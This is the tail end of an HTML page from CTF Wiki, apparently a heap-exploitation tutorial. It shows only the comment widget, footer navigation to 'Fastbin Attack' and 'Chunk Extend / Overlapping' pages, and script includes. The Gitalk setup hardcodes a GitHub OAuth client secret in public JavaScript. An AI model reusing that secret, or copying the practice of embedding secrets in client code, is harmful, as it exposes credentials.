</ul>
                
                  
                
              
              
                <!-- Set from config but allow override -->
   

<hr>
<blockquote class="page-copyright">
    <p>本页面的全部内容在 <strong>CC BY-NC-SA 4.0</strong> 协议之条款下提供，附加条款亦可能应用。</p>
</blockquote>
<!-- Comments Integration -->
 
<h2 id="__comments">评论</h2>
<form id="gitalk-form" onsubmit="return false;">
    <div id="gitalk-container"></div>
</form>
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
<script src="https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script>
    const gitalk = new Gitalk({
        clientID: 'd78d2e8d782d95560289',
        clientSecret: '954f1e7f8ae9b2566272a2105fe8df60b50e8e9b',
        repo: 'comment',
        owner: 'ctf-wiki',
        admin: ['40huo', 'iromise'],
        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
        distractionFreeMode: false  // Facebook-like distraction free mode
    })

    gitalk.render('gitalk-container')
</script> 
              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../fastbin_attack/" title="Fastbin Attack" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  后退
                </span>
                Fastbin Attack
              </span>
            </div>
          </a>
        
        
          <a href="../chunk_extend_overlapping/" title="Chunk Extend / Overlapping" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  前进
                </span>
                Chunk Extend / Overlapping
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; 2016 - 2018 CTF Wiki Team
          </div>
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../../assets/javascripts/application.51c3f73e.js"></script>
      
        
        
          
          <script src="../../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
          
            
              
              
            
          
          
        
      
      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
      
        <script src="../../../../_static/js/extra.js"></script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
        <script src="../../../../search/main.js"></script>
      
    
  </body>
</html>